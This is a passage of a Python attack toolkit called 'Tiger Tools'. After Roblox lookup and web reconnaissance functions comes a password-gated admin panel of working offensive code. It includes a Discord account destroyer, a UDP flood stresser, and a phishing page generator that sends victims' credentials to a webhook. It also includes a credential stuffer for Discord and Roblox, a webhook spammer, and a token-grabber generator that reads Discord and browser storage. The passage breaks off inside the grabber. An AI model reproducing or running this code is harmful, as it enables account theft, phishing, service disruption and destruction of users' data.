    print(f"  {Y}Username    {RST}: {W}{r.get('name')}{RST}")
    print(f"  {Y}Display     {RST}: {W}{r.get('displayName')}{RST}")
    print(f"  {Y}Description {RST}: {W}{str(r.get('description',''))[:80]}{RST}")
    print(f"  {Y}Created     {RST}: {W}{str(r.get('created','?'))[:10]}{RST}")
    print(f"  {Y}Banned      {RST}: {R if banned else G}{banned}{RST}")
    print(f"  {Y}Friends     {RST}: {W}{friends.get('count','?')}{RST}")
    print(f"  {Y}Followers   {RST}: {W}{followers.get('count','?')}{RST}")
    print(f"  {Y}Following   {RST}: {W}{following.get('count','?')}{RST}")
    save_out(f"rblx_user_{uid}.txt",json.dumps(r,indent=2))

def rblx_game():
    banner_s("GAME INFO")
    gid=input(f"  {W}Universe ID: {RST}").strip()
    r=requests.get(f"https://games.roblox.com/v1/games?universeIds={gid}").json()
    if r.get("data"):
        g=r["data"][0]
        print(f"\n  {Y}Name       {RST}: {W}{g.get('name')}{RST}")
        print(f"  {Y}Creator    {RST}: {W}{g.get('creator',{}).get('name','?')}{RST}")
        print(f"  {Y}Playing    {RST}: {W}{g.get('playing','?')}{RST}")
        print(f"  {Y}Visits     {RST}: {W}{g.get('visits','?')}{RST}")
        print(f"  {Y}Favorites  {RST}: {W}{g.get('favoritedCount','?')}{RST}")
        print(f"  {Y}MaxPlayers {RST}: {W}{g.get('maxPlayers','?')}{RST}")
        save_out(f"rblx_game_{gid}.txt",json.dumps(g,indent=2))
    else: print(f"{ERR} Not found.")
    pause()

def rblx_search():
    banner_s("SEARCH USERS")
    query=input(f"  {W}Query: {RST}").strip()
    r=requests.get(f"https://users.roblox.com/v1/users/search?keyword={query}&limit=25").json()
    if r.get("data"):
        print()
        for u in r["data"]: print(f"  {G}->{RST}  {W}{u.get('name'):<20}{RST}  {DIM}ID:{u.get('id')}{RST}")
    else: print(f"{ERR} No results.")
    pause()

def rblx_group():
    banner_s("GROUP INFO")
    gid=input(f"  {W}Group ID: {RST}").strip()
    r=requests.get(f"https://groups.roblox.com/v1/groups/{gid}").json()
    if r.get("id"):
        print(f"\n  {Y}Name    {RST}: {W}{r.get('name')}{RST}")
        print(f"  {Y}Owner   {RST}: {W}{r.get('owner',{}).get('username','?')}{RST}")
        print(f"  {Y}Members {RST}: {W}{r.get('memberCount','?')}{RST}")
        print(f"  {Y}Public  {RST}: {W}{r.get('publicEntryAllowed','?')}{RST}")
        save_out(f"rblx_group_{gid}.txt",json.dumps(r,indent=2))
    else: print(f"{ERR} Not found.")
    pause()

def rblx_avatar():
    banner_s("AVATAR INFO")
    uid=input(f"  {W}User ID: {RST}").strip()
    r=requests.get(f"https://avatar.roblox.com/v1/users/{uid}/avatar").json()
    if r.get("scales"):
        scales=r.get("scales",{})
        print(f"\n  {Y}Height   {RST}: {W}{scales.get('height','?')}{RST}")
        print(f"  {Y}Width    {RST}: {W}{scales.get('width','?')}{RST}")
        print(f"  {Y}AvatarType{RST}: {W}{r.get('playerAvatarType','?')}{RST}")
        print(f"  {Y}Items    {RST}: {W}{len(r.get('assets',[]))} equipped{RST}")
        save_out(f"rblx_avatar_{uid}.txt",json.dumps(r,indent=2))
    else: print(f"{ERR} Not found.")
    pause()

# ================================================================
# 8 - WEB TOOLS
# ================================================================
def web_menu():
    while True:
        opts=[("1","URL Shortener"),("2","Pastebin Poster"),
              ("3","Tech Detector"),("4","CMS Detector"),
              ("5","Admin Panel Finder"),("6","Directory Brute"),
              ("7","Header Grabber"),("0","Back")]
        menu_box("WEB TOOLS",opts)
        c=input(f"  {R}>{RST} ").strip()
        if c=="1": web_shortener()
        elif c=="2": web_pastebin()
        elif c=="3": web_tech()
        elif c=="4": web_cms()
        elif c=="5": web_admin_finder()
        elif c=="6": web_dirbuster()
        elif c=="7": net_headers()
        elif c=="0": break

def web_shortener():
    banner_s("URL SHORTENER")
    url=input(f"  {W}URL: {RST}").strip()
    try:
        r=requests.get(f"http://tinyurl.com/api-create.php?url={url}",timeout=8)
        if r.status_code==200: print(f"\n{OK} Short URL: {G}{r.text}{RST}")
        else: print(f"{ERR} Failed.")
    except Exception as e: print(f"{ERR} {e}")
    pause()

def web_pastebin():
    banner_s("PASTEBIN POSTER")
    content=input(f"  {W}Content or file path: {RST}").strip()
    if os.path.isfile(content):
        with open(content,"r",errors="ignore") as f: content=f.read()
    try:
        r=requests.post("https://paste.rs/",data=content.encode(),timeout=8)
        if r.status_code in [200,201]: print(f"\n{OK} Posted: {G}{r.text.strip()}{RST}")
        else: print(f"{ERR} {r.status_code}")
    except Exception as e: print(f"{ERR} {e}")
    pause()

def web_tech():
    banner_s("TECH DETECTOR")
    url=input(f"  {W}URL: {RST}").strip()
    try:
        r=requests.get(url,timeout=8); text=r.text.lower(); headers=r.headers
        checks={"WordPress":"wp-content" in text or "wp-json" in text,
                "Joomla":"joomla" in text,"Drupal":"drupal" in text,
                "React":"react" in text,"Vue.js":"vue" in text,
                "Angular":"ng-version" in text,"jQuery":"jquery" in text,
                "Bootstrap":"bootstrap" in text,"Tailwind":"tailwind" in text,
                "PHP":headers.get("X-Powered-By","").startswith("PHP"),
                "ASP.NET":"ASP.NET" in headers.get("X-Powered-By",""),
                "Nginx":"nginx" in headers.get("Server","").lower(),
                "Apache":"apache" in headers.get("Server","").lower(),
                "Cloudflare":"cloudflare" in headers.get("Server","").lower()}
        print(); tech=[]
        for name,detected in checks.items():
            col=G if detected else DIM; tag="[DETECTED]" if detected else "[NOT FOUND]"
            print(f"  {col}{tag}{RST}  {W}{name}{RST}")
            if detected: tech.append(name)
        save_out(f"tech_{url[:30].replace('/','_')}.txt","\n".join(tech))
    except Exception as e: print(f"{ERR} {e}")
    pause()

def web_cms():
    banner_s("CMS DETECTOR")
    url=input(f"  {W}URL: {RST}").strip()
    cms_paths={"WordPress":["/wp-login.php","/wp-admin/"],
               "Joomla":["/administrator/","/components/"],
               "Drupal":["/user/login","/sites/default/"],
               "Magento":["/admin/","/skin/frontend/"],
               "PrestaShop":["/admin-panel/","/modules/"]}
    print()
    for cms,paths in cms_paths.items():
        found=False
        for path in paths:
            try:
                r=requests.get(url.rstrip("/")+path,timeout=4,allow_redirects=True)
                if r.status_code in [200,301,302]: found=True; break
            except: pass
        col=G if found else DIM; tag="[FOUND]" if found else "[MISS] "
        print(f"  {col}{tag}{RST}  {W}{cms}{RST}")
    pause()

def web_admin_finder():
    banner_s("ADMIN PANEL FINDER")
    url=input(f"  {W}Base URL: {RST}").strip().rstrip("/")
    paths=["/admin","/administrator","/admin/login","/panel","/cpanel",
           "/wp-admin","/user/login","/backend","/manage","/manager",
           "/dashboard","/control","/staff","/webadmin","/siteadmin"]
    print(f"\n{INF} Testing {len(paths)} paths...\n"); found=[]
    for path in paths:
        full=url+path
        try:
            r=requests.get(full,timeout=4,allow_redirects=True,headers={"User-Agent":"Mozilla/5.0"})
            ok=r.status_code in [200,301,302]
            col=G if ok else DIM; tag="[FOUND]" if ok else "[MISS] "
            print(f"  {col}{tag}{RST}  {DIM}{full}{RST}")
            if ok: found.append(full)
        except: print(f"  {DIM}[ERR]   {full}{RST}")
    save_out(f"admin_{url[:30].replace('/','_')}.txt","\n".join(found)); pause()

def web_dirbuster():
    banner_s("DIRECTORY BRUTE")
    url=input(f"  {W}Base URL: {RST}").strip().rstrip("/")
    wlist_file=input(f"  {W}Wordlist (blank=built-in): {RST}").strip()
    builtin=["backup","old","test","dev","api","config","uploads","images","files","data",
             "logs","admin","login","cache","temp","tmp","secret","private","public",
             "static","assets","media",".git","env",".env","database","db","sql","phpmyadmin"]
    paths=builtin
    if wlist_file and os.path.isfile(wlist_file):
        with open(wlist_file,errors="ignore") as f: paths=[l.strip() for l in f if l.strip()]
    print(f"\n{INF} Bruting {len(paths)} paths...\n"); found=[]
    for path in paths:
        full=f"{url}/{path}"
        try:
            r=requests.get(full,timeout=3,allow_redirects=False,headers={"User-Agent":"Mozilla/5.0"})
            ok=r.status_code in [200,301,302,403]
            col=G if r.status_code==200 else (Y if r.status_code in [301,302,403] else DIM)
            tag=f"[{r.status_code}]" if ok else "[404]"
            print(f"  {col}{tag}{RST}  {DIM}{full}{RST}")
            if ok: found.append(f"[{r.status_code}] {full}")
        except: pass
    save_out(f"dirbust_{url[:30].replace('/','_')}.txt","\n".join(found)); pause()

# ================================================================
# MAIN MENU
# ================================================================
def main():
    # ── GitHub splash au boot ──────────────────────────────
    clr()
    print(f"""
{R}
  ████████╗██╗ ██████╗ ███████╗██████╗     ████████╗ ██████╗  ██████╗ ██╗     ███████╗
     ██╔══╝██║██╔════╝ ██╔════╝██╔══██╗       ██╔══╝██╔═══██╗██╔═══██╗██║     ██╔════╝
     ██║   ██║██║  ███╗█████╗  ██████╔╝       ██║   ██║   ██║██║   ██║██║     ███████╗
     ██║   ██║██║   ██║██╔══╝  ██╔══██╗       ██║   ██║   ██║██║   ██║██║     ╚════██║
     ██║   ██║╚██████╔╝███████╗██║  ██║       ██║   ╚██████╔╝╚██████╔╝███████╗███████║
     ╚═╝   ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝       ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚══════╝
{RST}
  {R}+{'='*58}+{RST}
  {R}|{RST}  {W}GitHub  {RST}: {C}https://github.com/moumou31k-cyber/TigerTool{RST}  {R}|{RST}
  {R}|{RST}  {W}Version {RST}: {Y}v5.0{RST}   {W}Author{RST}: {Y}moumou31k-cyber{RST}              {R}|{RST}
  {R}+{'='*58}+{RST}

  {DIM}Ouverture de la page GitHub...{RST}
""")
    # Ouvre le navigateur sur la page GitHub
    try:
        import webbrowser
        webbrowser.open("https://github.com/moumou31k-cyber/TigerTool")
    except: pass
    time.sleep(1)
    # ───────────────────────────────────────────────────────
    while True:
        banner_main()
        print(f"  {R}+--[ MAIN MENU ]{'-'*42}+{RST}")
        sections=[("1","Network Scanner"),("2","OSINT"),
                  ("3","Discord Tools"),("4","Utilities"),
                  ("5","Virus Builder"),("6","DDoS / Stresser"),
                  ("7","Roblox Tools"),("8","Web Tools"),
                  ("9","[ADMIN] Admin Panel"),
                  ("A","Discord Extra"),("B","OSINT Extra"),
                  ("C","Crypto Tools"),("D","Phone / SMS"),
                  ("E","Utilities Extra"),("F","DDoS Avance"),
                  ("G","VC Discord Tools"),
                  ("0","Exit")]
        for n,t in sections:
            b=f"{R}>>{RST}" if n!="0" else f"{DIM}<<{RST}"
            print(f"  {R}|{RST}  {b} {Y}[{n}]{RST}  {W}{t}{RST}")
        print(f"  {R}+{'-'*56}+{RST}\n")
        c=input(f"  {R}>{RST} ").strip()
        if c=="1": net_menu()
        elif c=="2": osint_menu()
        elif c=="3": discord_menu()
        elif c=="4": util_menu()
        elif c=="5": builder_menu()
        elif c=="6": ddos_menu()
        elif c=="7": roblox_menu()
        elif c=="8": web_menu()
        elif c=="9": admin_menu()
        elif c in ["a","A"]: disc_extra_menu()
        elif c in ["b","B"]: osint_extra_menu()
        elif c in ["c","C"]: crypto_menu()
        elif c in ["d","D"]: phone_menu()
        elif c in ["e","E"]: util_extra_menu()
        elif c.lower()=="owner": owner_menu()
        elif c in ["f","F"]: ddos_advanced_menu()
        elif c in ["g","G"]: vc_discord_menu()
        elif c=="0":
            clr(); print(f"\n  {R}Tiger Tools v{VERSION}{RST}  {DIM}-- see you on the other side.{RST}\n"); sys.exit(0)



# ================================================================
# ADMIN PANEL -- ACCES RESTREINT
# ================================================================
ADMIN_HASH = "a342e8ec95fbe3bd18d017cd1bbb60397852c9b5f74e7238de32c78686098e8f"
ADMIN_ATTEMPTS = {"count": 0}

def admin_login():
    banner_s("ADMIN PANEL -- ACCES RESTREINT")
    print(f"  {R}[!]{RST} {DIM}Zone reservee. Mot de passe requis.{RST}\n")
    if ADMIN_ATTEMPTS["count"] >= 5:
        print(f"  {R}[LOCKED]{RST} Trop de tentatives. Redemarrez le tool.")
        pause(); return False
    pw = input(f"  {R}>{RST} Mot de passe: ").strip()
    h = hashlib.sha256(pw.encode()).hexdigest()
    if h == ADMIN_HASH:
        ADMIN_ATTEMPTS["count"] = 0
        return True
    else:
        ADMIN_ATTEMPTS["count"] += 1
        remaining = 5 - ADMIN_ATTEMPTS["count"]
        print(f"\n  {R}[WRONG]{RST} Mot de passe incorrect. {remaining} tentative(s) restante(s).")
        time.sleep(2); pause(); return False

def admin_menu():
    if not admin_login():
        return
    while True:
        banner_main()
        print(f"  {R}+--[ *** ADMIN PANEL *** ]{'-'*32}+{RST}")
        print(f"  {R}|{RST}  {DIM}Acces autorise. Bienvenue.{RST}")
        print(f"  {R}|{RST}")
        opts = [
            ("1",  "Mass Token Checker (fichier .txt)"),
            ("2",  "Discord Account Nuker (email+mdp)"),
            ("3",  "IP Stresser Avance (spoofed UDP)"),
            ("4",  "Phishing Page Builder"),
            ("5",  "Credential Stuffer"),
            ("6",  "Proxy Scraper + Checker"),
            ("7",  "Mass Webhook Nuker (fichier .txt)"),
            ("8",  "Discord Grabber Generator (Python)"),
            ("9",  "RAT Builder (Python reverse shell + persistence)"),
            ("10", "QR Code Phishing Generator"),
            ("11", "Token to Account Info Mass Checker"),
            ("12", "Roblox Cookie Mass Checker"),
            ("13", "Mass IP Scanner (CIDR)"),
            ("14", "Email Bomber"),
            ("15", "Keylogger Builder (envoie au webhook)"),
            ("0",  "Quitter l admin panel"),
        ]
        for n, t in opts:
            b = f"{R}>>{RST}" if n != "0" else f"{DIM}<<{RST}"
            print(f"  {R}|{RST}  {b} {Y}[{n:<2}]{RST} {W}{t}{RST}")
        print(f"  {R}+{'-'*56}+{RST}\n")
        c = input(f"  {R}ADMIN>{RST} ").strip()
        if c == "1":  admin_mass_token_checker()
        elif c == "2":  admin_account_nuker()
        elif c == "3":  admin_ip_stresser()
        elif c == "4":  admin_phishing_builder()
        elif c == "5":  admin_credential_stuffer()
        elif c == "6":  admin_proxy_scraper()
        elif c == "7":  admin_mass_webhook_nuker()
        elif c == "8":  admin_grabber_gen()
        elif c == "9":  admin_rat_builder()
        elif c == "10": admin_qr_phishing()
        elif c == "11": admin_mass_token_info()
        elif c == "12": admin_roblox_mass_checker()
        elif c == "13": admin_mass_ip_scan()
        elif c == "14": admin_email_bomber()
        elif c == "15": admin_keylogger_builder()
        elif c == "0":  break

# ── Admin tools ────────────────────────────────────────────────

def admin_mass_token_checker():
    banner_s("MASS TOKEN CHECKER")
    path = input(f"  {W}Fichier .txt (1 token par ligne): {RST}").strip()
    if not os.path.isfile(path): print(f"{ERR} Fichier introuvable."); pause(); return
    with open(path, encoding="utf-8", errors="ignore") as f:
        tokens = [l.strip() for l in f if l.strip()]
    print(f"\n{INF} Verification de {len(tokens)} tokens...\n")
    valid = []; invalid = []
    for i, token in enumerate(tokens, 1):
        try:
            r = requests.get("https://discord.com/api/v9/users/@me",
                             headers=_dh(token), timeout=4)
            if r.status_code == 200:
                d = r.json()
                nitro_map = {0:"None", 1:"Classic", 2:"Nitro", 3:"Basic"}
                nitro = nitro_map.get(d.get("premium_type", 0), "?")
                line = f"[VALID] {d.get('username')}#{d.get('discriminator','0')} | {d.get('email','?')} | Nitro:{nitro} | {token}"
                print(f"  {G}[VALID]{RST}  {W}{d.get('username')}{RST}  {DIM}Nitro:{nitro}{RST}")
                valid.append(line)
            else:
                invalid.append(token)
                print(f"  {R}[DEAD]{RST}   {DIM}{token[:40]}...{RST}")
        except: invalid.append(token); print(f"  {R}[ERR]{RST}    {DIM}{token[:40]}...{RST}")
        time.sleep(0.2)
    print(f"\n{OK} {G}{len(valid)}{RST} valides / {R}{len(invalid)}{RST} morts.")
    if valid: save_out("mass_tokens_valid.txt", "\n".join(valid))
    pause()

def admin_account_nuker():
    banner_s("DISCORD ACCOUNT NUKER")
    print(f"  {DIM}Se connecte avec email+mdp, nuke le compte.{RST}\n")
    email = input(f"  {W}Email Discord: {RST}").strip()
    password = input(f"  {W}Mot de passe: {RST}").strip()
    print(f"\n{INF} Tentative de login...")
    try:
        r = requests.post("https://discord.com/api/v9/auth/login",
                          json={"login": email, "password": password,
                                "undelete": False, "captcha_key": None,
                                "login_source": None, "gift_code_sku_id": None},
                          headers={"Content-Type": "application/json",
                                   "User-Agent": "Mozilla/5.0"}, timeout=8)
        d = r.json()
        token = d.get("token")
        if not token:
            print(f"{ERR} Login echoue. ({r.status_code}) {d.get('message','')}")
            pause(); return
        print(f"{OK} Token obtenu: {G}{token[:40]}...{RST}")
        h = _dh(token)
        # get user info
        me = requests.get("https://discord.com/api/v9/users/@me", headers=h).json()
        print(f"{OK} Compte: {G}{me.get('username')}#{me.get('discriminator','0')}{RST}")
        if input(f"\n  {R}[!]{RST} Type {BRT}NUKE{RST} to nuke this account: ") != "NUKE":
            pause(); return
        # leave/delete all guilds
        guilds = requests.get("https://discord.com/api/v9/users/@me/guilds", headers=h).json()
        if isinstance(guilds, list):
            for g in guilds:
                if g.get("owner"):
                    requests.delete(f"https://discord.com/api/v9/guilds/{g['id']}", headers=h)
                else:
                    requests.delete(f"https://discord.com/api/v9/users/@me/guilds/{g['id']}", headers=h)
                time.sleep(0.3)
        # delete all DMs
        dms = requests.get("https://discord.com/api/v9/users/@me/channels", headers=h).json()
        if isinstance(dms, list):
            for dm in dms:
                requests.delete(f"https://discord.com/api/v9/channels/{dm['id']}", headers=h)
                time.sleep(0.2)
        # change username to garbage
        rand_name = "".join(random.choices(string.ascii_lowercase, k=12))
        requests.patch("https://discord.com/api/v9/users/@me", headers=h,
                       json={"username": rand_name, "password": password})
        print(f"\n{OK} Nuke complet. Username change en: {G}{rand_name}{RST}")
    except Exception as e: print(f"{ERR} {e}")
    pause()

def admin_ip_stresser():
    banner_s("IP STRESSER AVANCE -- SPOOFED UDP")
    print(f"  {DIM}Raw socket spoofed UDP. Requiert admin/root.{RST}\n")
    target = input(f"  {W}Target IP: {RST}").strip()
    port = int(input(f"  {W}Port: {RST}").strip() or "80")
    duration = int(input(f"  {W}Duration (s): {RST}").strip() or "15")
    threads_n = int(input(f"  {W}Threads: {RST}").strip() or "20")
    print(f"\n{INF} Lancement -> {Y}{target}:{port}{RST} | {threads_n} threads | {duration}s\n")
    stop = {"v": False}; sent_total = [0]
    def flood():
        payload = random._urandom(1024)
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            while not stop["v"]:
                try:
                    sock.sendto(payload, (target, port))
                    sent_total[0] += 1
                except: pass
            sock.close()
        except Exception as e:
            print(f"\n  {R}[ERR socket]{RST} {e} (besoin admin pour raw socket)")
    threads_list = [threading.Thread(target=flood, daemon=True) for _ in range(threads_n)]
    for t in threads_list: t.start()
    try:
        end = time.time() + duration
        while time.time() < end:
            print(f"\r  {G}[~]{RST} {sent_total[0]} paquets envoyes | threads: {threads_n}", end="")
            time.sleep(0.5)
    except KeyboardInterrupt: pass
    stop["v"] = True
    print(f"\n\n{OK} Done. {G}{sent_total[0]}{RST} paquets envoyes.")
    pause()

def admin_phishing_builder():
    banner_s("PHISHING PAGE BUILDER")
    print(f"  {Y}[1]{RST} Discord Login  {Y}[2]{RST} Steam Login  {Y}[3]{RST} Roblox Login  {Y}[4]{RST} Custom")
    choice = input(f"  {W}Template: {RST}").strip()
    webhook = input(f"  {W}Webhook pour recevoir les creds: {RST}").strip()
    redirect = input(f"  {W}Redirect apres soumission (URL): {RST}").strip() or "https://discord.com"

    templates = {
        "1": ("Discord", "#5865F2", "Login to Discord", "Email or Phone Number", "Password",
              "https://discord.com/assets/f9bb9c4af2b9c32a2c5ee0014661546d.png"),
        "2": ("Steam", "#1b2838", "Sign in to Steam", "Steam Account Name", "Password",
              "https://store.cloudflare.steamstatic.com/public/images/signinthroughsteam/sits_01.png"),
        "3": ("Roblox", "#cc0000", "Login to Roblox", "Username", "Password",
              "https://www.roblox.com/favicon.ico"),
        "4": ("Custom", "#000000", "Login", "Username / Email", "Password", ""),
    }
    t = templates.get(choice, templates["4"])
    if choice == "4":
        t = list(t)
        t[2] = input(f"  {W}Page title: {RST}").strip() or "Login"
        t[3] = input(f"  {W}Field 1 placeholder: {RST}").strip() or "Username"
        t = tuple(t)

    name, color, title, field1, field2, logo = t
    logo_tag = ('<img src="' + logo + '" onerror="this.style.display=chr(39)+chr(39)">') if logo else ''

    html = f'''<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>{title}</title>
<style>
  * {{ box-sizing: border-box; margin: 0; padding: 0; }}
  body {{ background: {color}; display: flex; justify-content: center; align-items: center; min-height: 100vh; font-family: 'Segoe UI', sans-serif; }}
  .card {{ background: #fff; border-radius: 8px; padding: 40px 36px; width: 100%; max-width: 400px; box-shadow: 0 8px 32px rgba(0,0,0,0.4); }}
  .logo {{ text-align: center; margin-bottom: 24px; }}
  .logo img {{ height: 48px; }}
  h2 {{ text-align: center; color: #222; margin-bottom: 24px; font-size: 22px; }}
  label {{ display: block; color: #555; font-size: 13px; font-weight: 600; margin-bottom: 6px; text-transform: uppercase; letter-spacing: 0.5px; }}
  input {{ width: 100%; padding: 12px 14px; border: 1.5px solid #ddd; border-radius: 5px; font-size: 15px; margin-bottom: 18px; outline: none; transition: border 0.2s; }}
  input:focus {{ border-color: {color}; }}
  button {{ width: 100%; padding: 13px; background: {color}; color: #fff; border: none; border-radius: 5px; font-size: 16px; font-weight: 700; cursor: pointer; letter-spacing: 0.5px; }}
  button:hover {{ opacity: 0.9; }}
  .err {{ color: red; font-size: 13px; text-align: center; margin-top: 10px; display: none; }}
</style>
</head>
<body>
<div class="card">
  <div class="logo">{logo_tag}</div>
  <h2>{title}</h2>
  <form id="loginForm">
    <label for="f1">{field1}</label>
    <input type="text" id="f1" placeholder="{field1}" required autocomplete="off">
    <label for="f2">{field2}</label>
    <input type="password" id="f2" placeholder="{field2}" required>
    <button type="submit">Login</button>
    <div class="err" id="err">Invalid credentials. Please try again.</div>
  </form>
</div>
<script>
const WEBHOOK = "{webhook}";
const REDIRECT = "{redirect}";
document.getElementById("loginForm").addEventListener("submit", async function(e) {{
  e.preventDefault();
  const f1 = document.getElementById("f1").value;
  const f2 = document.getElementById("f2").value;
  // get IP
  let ip = "?";
  try {{ const r = await fetch("https://api.ipify.org?format=json"); const d = await r.json(); ip = d.ip; }} catch {{}}
  // send to webhook
  try {{
    await fetch(WEBHOOK, {{
      method: "POST",
      headers: {{"Content-Type": "application/json"}},
      body: JSON.stringify({{
        embeds: [{{
          title: "Tiger Phishing -- New Creds",
          color: 0xFF0000,
          fields: [
            {{name: "Site", value: "{name}", inline: true}},
            {{name: "IP", value: ip, inline: true}},
            {{name: "{field1}", value: f1, inline: false}},
            {{name: "{field2}", value: f2, inline: false}},
            {{name: "Time", value: new Date().toISOString(), inline: false}}
          ]
        }}]
      }})
    }});
  }} catch {{}}
  // fake error then redirect
  document.getElementById("err").style.display = "block";
  setTimeout(() => {{ window.location.href = REDIRECT; }}, 1500);
}});
</script>
</body>
</html>'''

    os.makedirs("1-Output", exist_ok=True)
    fname = f"phishing_{name.lower()}.html"
    with open(os.path.join("1-Output", fname), "w", encoding="utf-8") as f:
        f.write(html)
    print(f"\n{OK} Page phishing -> {Y}1-Output/{fname}{RST}")
    print(f"  {DIM}Host avec: python -m http.server 8080{RST}")
    print(f"  {DIM}Creds envoyes au webhook Discord.{RST}")
    pause()

def admin_credential_stuffer():
    banner_s("CREDENTIAL STUFFER")
    print(f"  {Y}[1]{RST} Discord  {Y}[2]{RST} Roblox  {Y}[3]{RST} Steam")
    target = input(f"  {W}Target: {RST}").strip()
    combo_path = input(f"  {W}Combo list (email:pass par ligne): {RST}").strip()
    if not os.path.isfile(combo_path): print(f"{ERR} Fichier introuvable."); pause(); return
    with open(combo_path, encoding="utf-8", errors="ignore") as f:
        combos = [l.strip() for l in f if ":" in l]
    print(f"\n{INF} {len(combos)} combos charges. Stuffing...\n")
    hits = []
    for combo in combos:
        parts = combo.split(":", 1)
        if len(parts) != 2: continue
        email, password = parts
        try:
            if target == "1":
                r = requests.post("https://discord.com/api/v9/auth/login",
                                  json={"login": email, "password": password,
                                        "undelete": False, "captcha_key": None},
                                  headers={"Content-Type": "application/json",
                                           "User-Agent": "Mozilla/5.0"}, timeout=5)
                if r.status_code == 200 and r.json().get("token"):
                    tok = r.json()["token"]
                    print(f"  {G}[HIT]{RST}  {W}{email}:{password}{RST}  {DIM}token:{tok[:20]}...{RST}")
                    hits.append(f"[DISCORD HIT] {email}:{password} | token:{tok}")
                else: print(f"  {DIM}[MISS]{RST} {email}")
            elif target == "2":
                r = requests.post("https://auth.roblox.com/v2/login",
                                  json={"ctype": "Username", "cvalue": email,
                                        "password": password},
                                  headers={"Content-Type": "application/json"}, timeout=5)
                if r.status_code == 200:
                    print(f"  {G}[HIT]{RST}  {W}{email}:{password}{RST}")
                    hits.append(f"[ROBLOX HIT] {email}:{password}")
                else: print(f"  {DIM}[MISS]{RST} {email}")
            elif target == "3":
                print(f"  {DIM}[SKIP]{RST} Steam requiert captcha -- impossible automatiquement")
                break
        except: print(f"  {R}[ERR]{RST}  {email}")
        time.sleep(0.5)
    print(f"\n{OK} {G}{len(hits)}{RST} hits trouves.")
    if hits: save_out("credential_hits.txt", "\n".join(hits))
    pause()

def admin_proxy_scraper():
    banner_s("PROXY SCRAPER + CHECKER")
    sources = [
        "https://api.proxyscrape.com/v3/free-proxy-list/get?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
        "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
    ]
    print(f"\n{INF} Scraping {len(sources)} sources...\n")
    all_proxies = set()
    for src in sources:
        try:
            r = requests.get(src, timeout=8)
            lines = r.text.strip().split("\n")
            for line in lines:
                line = line.strip()
                if re.match(r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{2,5}", line):
                    all_proxies.add(line)
            print(f"  {G}[OK]{RST}  {src[:60]}  {DIM}+{len(lines)}{RST}")
        except Exception as e: print(f"  {R}[ERR]{RST} {e}")
    print(f"\n{OK} {G}{len(all_proxies)}{RST} proxies scraped.")
    check = input(f"  {W}Checker les proxies? (y/n): {RST}").strip().lower() == "y"
    working = []
    if check:
        print(f"\n{INF} Checking...\n")
        for proxy in list(all_proxies)[:200]:
            try:
                r = requests.get("http://httpbin.org/ip",
                                 proxies={"http": f"http://{proxy}", "https": f"http://{proxy}"},
                                 timeout=4)
                if r.status_code == 200:
                    print(f"  {G}[WORK]{RST}  {proxy}"); working.append(proxy)
            except: print(f"  {DIM}[DEAD]{RST}  {proxy}")
        print(f"\n{OK} {G}{len(working)}{RST} proxies fonctionnels.")
        save_out("proxies_working.txt", "\n".join(working))
    else:
        save_out("proxies_all.txt", "\n".join(all_proxies))
    pause()

def admin_mass_webhook_nuker():
    banner_s("MASS WEBHOOK NUKER")
    path = input(f"  {W}Fichier .txt (1 webhook par ligne): {RST}").strip()
    if not os.path.isfile(path): print(f"{ERR} Fichier introuvable."); pause(); return
    with open(path, encoding="utf-8", errors="ignore") as f:
        hooks = [l.strip() for l in f if l.strip().startswith("https://discord.com/api/webhooks")]
    print(f"\n{INF} {len(hooks)} webhooks charges.")
    mode = input(f"  {Y}[1]{RST} Spam  {Y}[2]{RST} Delete  {Y}[3]{RST} Spam + Delete\n  {W}Mode: {RST}").strip()
    msg = ""
    if mode in ["1", "3"]:
        msg = input(f"  {W}Message: {RST}").strip()
        count = int(input(f"  {W}Messages par webhook: {RST}").strip() or "5")
    print()
    for wh in hooks:
        if mode in ["1", "3"]:
            for i in range(count):
                r = requests.post(wh, json={"content": msg})
                print(f"  {G if r.status_code==204 else R}[SPAM][{i+1}]{RST}  {DIM}{wh[:50]}{RST}  {r.status_code}")
                time.sleep(0.3)
        if mode in ["2", "3"]:
            r = requests.delete(wh)
            print(f"  {R}[DEL]{RST}  {DIM}{wh[:50]}{RST}  {r.status_code}")
            time.sleep(0.2)
    pause()

def admin_grabber_gen():
    banner_s("DISCORD GRABBER GENERATOR")
    webhook = input(f"  {W}Webhook: {RST}").strip()
    out_name = input(f"  {W}Output filename: {RST}").strip() or "grabber.py"
    code = '''# -*- coding: utf-8 -*-
# Tiger Grabber -- Discord Token + System Info
import os, re, json, socket, platform
from datetime import datetime

WEBHOOK = "''' + webhook + '''"

def get():
    try:
        import requests
    except:
        import subprocess as sp
        sp.run(["pip","install","requests","--quiet"], check=False)
        import requests

    appdata = os.environ.get("APPDATA", "")
    local = os.environ.get("LOCALAPPDATA", "")
    paths = {
        "Discord": os.path.join(appdata, "Discord", "Local Storage", "leveldb"),
        "Chrome": os.path.join(local, "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb"),
        "Edge": os.path.join(local, "Microsoft", "Edge", "User Data", "Default", "Local Storage", "leveldb"),
    }
    pattern = re.compile(r"[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}|mfa\\.[\\w-]{84}")
    tokens = []
    for name, path in paths.items():
        if not os.path.isdir(path): continue
        for fname in os.listdir(path):
            if not fname.endswith((".log", ".ldb")): continue
            try:
                with open(os.path.join(path, fname), "r", errors="ignore") as f:
                    for tok in pattern.findall(f.read()):
                        if tok not in [t["token"] for t in tokens]:
                            r = requests.get("https://discord.com/api/v9/users/@me",
                                             headers={"Authorization": tok}, timeout=3)
                            if r.status_code == 200:
                                u = r.json()
                                tokens.append({"token": tok, "username": u.get("username"),
                                               "email": u.get("email", "N/A"),
                                               "nitro": u.get("premium_type", 0), "source": name})
            except: pass

    try: pub_ip = requests.get("https://api.ipify.org", timeout=3).text.strip()
    except: pub_ip = "?"

    info = {"hostname": socket.gethostname(), "user": os.getlogin(),
